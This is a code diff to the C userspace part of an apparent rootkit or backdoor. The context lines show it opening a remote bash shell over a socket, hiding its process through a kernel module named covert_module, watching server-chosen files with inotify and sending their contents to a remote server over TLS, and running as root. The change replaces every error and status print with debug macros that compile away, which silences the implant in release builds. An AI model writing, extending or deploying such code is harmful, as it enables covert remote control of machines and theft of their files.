@@ -48,6 +48,17 @@
 #define SHELL_SOCK_PATH ("/run/systemd/system/bus")
 #endif
 
+#ifndef NDEBUG
+#define DEBUG_PRINT(...) printf(__VA_ARGS__)
+#else
+#define DEBUG_PRINT(...) ((void)0)
+#endif
+#ifndef NDEBUG
+#define DEBUG_PERROR(str) perror(str)
+#else
+#define DEBUG_PERROR(str) ((void)0)
+#endif
+
 struct inot_watch {
     int wd;
     char name[NAME_MAX + 1];
@@ -85,7 +96,7 @@ extern char **environ;
 pid_t wrapped_fork(void) {
     pid_t pid;
     if ((pid = fork()) == -1) {
-        perror("fork()");
+        DEBUG_PERROR("fork()");
         exit(EXIT_FAILURE);
     }
     return pid;
@@ -95,7 +106,7 @@ void* wrapped_mmap(size_t size) {
     void* out = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
     if (out == MAP_FAILED) {
-        perror("mmap");
+        DEBUG_PERROR("mmap");
         exit(EXIT_FAILURE);
     }
     return out;
@@ -105,7 +116,7 @@ void hide_proc(void) {
     unsigned char buf[30];
     memset(buf, 0, 30);
     sprintf((char*) buf, "hidek %d", getpid());
-    printf("Writing %s to module on process start\n", buf);
+    DEBUG_PRINT("Writing %s to module on process start\n", buf);
     write(conn_sock, buf, strlen((char*) buf));
 }
 
@@ -133,19 +144,19 @@ void run_remote_shell(void) {
     errno = 0;
 
     if (connect(remote_sock, (struct sockaddr*) &su, sizeof(struct sockaddr_un))) {
-        perror("connect");
-        printf("%d\n", errno);
+        DEBUG_PERROR("connect");
+        DEBUG_PRINT("%d\n", errno);
         exit(EXIT_FAILURE);
     }
-    printf("connect %d\n", remote_sock);
+    DEBUG_PRINT("connect %d\n", remote_sock);
 
-    printf("shell running\n");
+    DEBUG_PRINT("shell running\n");
 
     dup2(remote_sock, 0);
     dup2(remote_sock, 1);
     dup2(remote_sock, 2);
 
-    printf("Shell PID: %d\n", getpid());
+    DEBUG_PRINT("Shell PID: %d\n", getpid());
 
     const char* sh[2];
     sh[0] = "/bin/bash";
@@ -177,7 +188,7 @@ int create_unix_socket(const char* sock_path) {
 
     unlink(sock_path);
     if (bind(local_tls_socket, (struct sockaddr*) &su, sizeof(struct sockaddr_un)) == -1) {
-        perror("bind");
+        DEBUG_PERROR("bind");
         return EXIT_FAILURE;
     }
     return local_tls_socket;
@@ -205,7 +216,7 @@ int create_remote_socket(void) {
     sin.sin_port = htons(PORT);
 
     if (connect(remote_sock, (struct sockaddr*) &sin, sizeof(struct sockaddr_in))) {
-        perror("remote connect");
+        DEBUG_PERROR("remote connect");
         return EXIT_FAILURE;
     }
     return remote_sock;
@@ -227,7 +238,7 @@ int create_remote_socket(void) {
 int create_epoll_fd(void) {
     int efd;
     if ((efd = epoll_create1(0)) == -1) {
-        perror("epoll_create1");
+        DEBUG_PERROR("epoll_create1");
         exit(EXIT_FAILURE);
     }
     return efd;
@@ -250,7 +261,7 @@ int create_epoll_fd(void) {
  */
 void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev) {
     if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
-        perror("epoll_ctl");
+        DEBUG_PERROR("epoll_ctl");
         exit(EXIT_FAILURE);
     }
 }
@@ -276,7 +287,7 @@ int wait_for_epoll_event(const int epollfd, struct epoll_event* events) {
             //Interrupted by signal, ignore it
             return 0;
         }
-        perror("epoll_wait");
+        DEBUG_PERROR("epoll_wait");
         exit(EXIT_FAILURE);
     }
     return nevents;
@@ -285,7 +296,7 @@ int wait_for_epoll_event(const int epollfd, struct epoll_event* events) {
 int create_inotify_descriptor(void) {
     int fd = inotify_init1(IN_CLOEXEC);
     if (fd < 0) {
-        perror("inotify_init1");
+        DEBUG_PERROR("inotify_init1");
         exit(EXIT_FAILURE);
     }
     return fd;
@@ -319,24 +330,24 @@ void epoll_event_loop(SSL* ssl) {
         assert(n != -1);
         for (int i = 0; i < n; ++i) {
             if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
-                fprintf(stderr, "Sock error\n");
+                DEBUG_PRINT("Sock error\n");
                 close(eventList[i].data.fd);
             } else if (eventList[i].events & EPOLLIN) {
                 int size;
                 while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
-                    printf("Read %d bytes\n", size);
-                    printf("Wrote %d bytes to server\n", size);
+                    DEBUG_PRINT("Read %d bytes\n", size);
+                    DEBUG_PRINT("Wrote %d bytes to server\n", size);
                     if (eventList[i].data.fd == remote_shell_sock) {
                         memmove(buffer + 1, buffer, size);
                         buffer[0] = 's';
                         SSL_write(ssl, buffer, size + 1);
                     } else if (eventList[i].data.fd == conn_sock) {
                         if (strncmp((const char *) buffer, "foobar", 6) == 0) {
-                            printf("User killswitch triggered\n");
+                            DEBUG_PRINT("User killswitch triggered\n");
                             //Time to kill the application
                             system("rmmod covert_module");
                         } else {
-                            printf("Got other module data\n");
+                            DEBUG_PRINT("Got other module data\n");
                             SSL_write(ssl, buffer, size);
                         }
                     } else {
@@ -348,7 +359,7 @@ void epoll_event_loop(SSL* ssl) {
                 }
                 if (size == -1) {
                     if (errno != EAGAIN) {
-                        perror("read");
+                        DEBUG_PERROR("read");
                         goto done;
                     }
                 }
@@ -360,10 +371,10 @@ done:
 }
 
 void handle_inotify_create(struct inotify_event* ie) {
-    printf("%s was created\n", ie->name);
+    DEBUG_PRINT("%s was created\n", ie->name);
     int wd;
     if ((wd = inotify_add_watch(*inot_fd, ie->name, IN_CLOSE_WRITE | IN_IGNORED)) < 0) {
-        perror("inotify_add_watch create");
+        DEBUG_PERROR("inotify_add_watch create");
         exit(EXIT_FAILURE);
     }
     //Save watch descriptor
@@ -380,7 +391,7 @@ void handle_inotify_ignore(struct inotify_event* ie) {
 
             if ((wd = inotify_add_watch(*inot_fd, inot_wds[j].name, IN_CLOSE_WRITE | IN_IGNORED))
                     < 0) {
-                perror("read inotify_add_watch");
+                DEBUG_PERROR("read inotify_add_watch");
                 exit(EXIT_FAILURE);
             }
 
@@ -391,17 +402,17 @@ void handle_inotify_ignore(struct inotify_event* ie) {
 }
 
 int handle_inotify_modified(struct inotify_event* ie) {
-    //printf("%s was modified\n", ie->name);
+    //DEBUG_PRINT("%s was modified\n", ie->name);
     const char* file_name = NULL;
     if (ie->len > 0) {
-        printf("Grabbing name directly of length %d\n", ie->len);
+        DEBUG_PRINT("Grabbing name directly of length %d\n", ie->len);
         //We have a name
         file_name = ie->name;
     } else {
         //Retrieve the name
-        printf("Watch count %lu\n", *inot_watch_count);
+        DEBUG_PRINT("Watch count %lu\n", *inot_watch_count);
         for (size_t j = 0; j < *inot_watch_count; ++j) {
-            printf("Looking for file watch name: %s\n", inot_wds[j].name);
+            DEBUG_PRINT("Looking for file watch name: %s\n", inot_wds[j].name);
             if (inot_wds[j].wd == ie->wd) {
                 //Found our name
                 file_name = inot_wds[j].name;
@@ -410,14 +421,14 @@ int handle_inotify_modified(struct inotify_event* ie) {
         }
     }
     if (!file_name) {
-        printf("Failed to get filename for the modified file\n");
+        DEBUG_PRINT("Failed to get filename for the modified file\n");
         return -1;
     }
     //Time to write the file contents to the server
     FILE* f = fopen(file_name, "r");
     if (!f) {
-        fprintf(stderr, "%s\n", file_name);
-        perror("inotify fopen");
+        DEBUG_PRINT("%s\n", file_name);
+        DEBUG_PERROR("inotify fopen");
         return -1;
     }
 
@@ -431,7 +442,7 @@ int handle_inotify_modified(struct inotify_event* ie) {
         }
         //Write to server via local socket listening in epoll
         write(local_socks[1], file_buffer, size + 1);
-        printf("Wrote file data to the server\n");
+        DEBUG_PRINT("Wrote file data to the server\n");
     }
     return 0;
 }
@@ -439,7 +450,7 @@ int handle_inotify_modified(struct inotify_event* ie) {
 void unwatch_inotify(void) {
     //Unregister all inotify handles here
     for (size_t i = 0; i < *inot_watch_count; ++i) {
-        printf("Removing inotify watch\n");
+        DEBUG_PRINT("Removing inotify watch\n");
         inotify_rm_watch(*inot_fd, inot_wds[i].wd);
     }
     *inot_watch_count = 0;
@@ -453,7 +464,7 @@ void inotify_event_loop(void) {
         errno = 0;
         int s = read(*inot_fd, buf, sizeof(buf));
         if (s < 0 && errno != EAGAIN) {
-            perror("inotify_epoll_read");
+            DEBUG_PERROR("inotify_epoll_read");
             exit(EXIT_FAILURE);
         }
         if (errno == EAGAIN) {
@@ -462,7 +473,7 @@ void inotify_event_loop(void) {
         struct inotify_event* ie_tmp = ie;
         while (s > 0) {
             if (ie_tmp->mask & IN_Q_OVERFLOW) {
-                printf("inotify queue overflow\n");
+                DEBUG_PRINT("inotify queue overflow\n");
             }
             //handle updated log file
             if (ie_tmp->mask & IN_CLOSE_WRITE) {
@@ -474,9 +485,9 @@ void inotify_event_loop(void) {
             } else if (ie_tmp->mask & IN_IGNORED) {
                 handle_inotify_ignore(ie_tmp);
             }
-            printf("Old s %d\n", s);
+            DEBUG_PRINT("Old s %d\n", s);
             s -= sizeof(struct inotify_event) + ie_tmp->len;
-            printf("New s %d\n", s);
+            DEBUG_PRINT("New s %d\n", s);
             ie_tmp = (struct inotify_event*) (((unsigned char*) ie_tmp)
                     + sizeof(struct inotify_event) + ie_tmp->len);
         }
@@ -487,9 +498,9 @@ void ssl_read_event_loop(SSL* ssl) {
     //Read
     for (;;) {
         int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
-        printf("Read %d from server\n", size);
+        DEBUG_PRINT("Read %d from server\n", size);
         if (size < 0) {
-            perror("SSL_read");
+            DEBUG_PERROR("SSL_read");
             break;
         } else if (size == 0) {
             break;
@@ -504,7 +515,7 @@ void ssl_read_event_loop(SSL* ssl) {
                 if ((wd = inotify_add_watch(*inot_fd, (char*) (buffer + 7),
                              IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
                         < 0) {
-                    perror("inotify_add_watch");
+                    DEBUG_PERROR("inotify_add_watch");
                     //exit(EXIT_FAILURE);
 
                     strcpy((char*) buffer, "Bad inotify path");
@@ -518,11 +529,11 @@ void ssl_read_event_loop(SSL* ssl) {
             } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
                 unwatch_inotify();
             } else {
-                printf("Wrote %d to kernel module\n", size);
+                DEBUG_PRINT("Wrote %d to kernel module\n", size);
                 write(conn_sock, buffer + 1, size - 1);
             }
         } else {
-            printf("Wrote %d to remote shell\n", size);
+            DEBUG_PRINT("Wrote %d to remote shell\n", size);
             //Pass message to shell process
             write(remote_shell_sock, buffer, size);
         }
@@ -546,11 +557,11 @@ void ssl_read_event_loop(SSL* ssl) {
  */
 int main(void) {
     if (setuid(0)) {
-        perror("setuid");
+        DEBUG_PERROR("setuid");
         exit(EXIT_FAILURE);
     }
     if (setgid(0)) {
-        perror("setgid");
+        DEBUG_PERROR("setgid");
         exit(EXIT_FAILURE);
     }
 
@@ -615,13 +626,13 @@ int main(void) {
 
         close(remote_shell_unix);
 
-        printf("accept %d\n", remote_shell_sock);
+        DEBUG_PRINT("accept %d\n", remote_shell_sock);
     }
 
     promote_child();
 
     if (socketpair(AF_UNIX, SOCK_DGRAM, 0, local_socks) < 0) {
-        perror("socketpair");
+        DEBUG_PERROR("socketpair");
         exit(EXIT_FAILURE);
     }
     fcntl(local_socks[0], F_SETFL, fcntl(local_socks[0], F_GETFL, 0) | O_NONBLOCK);
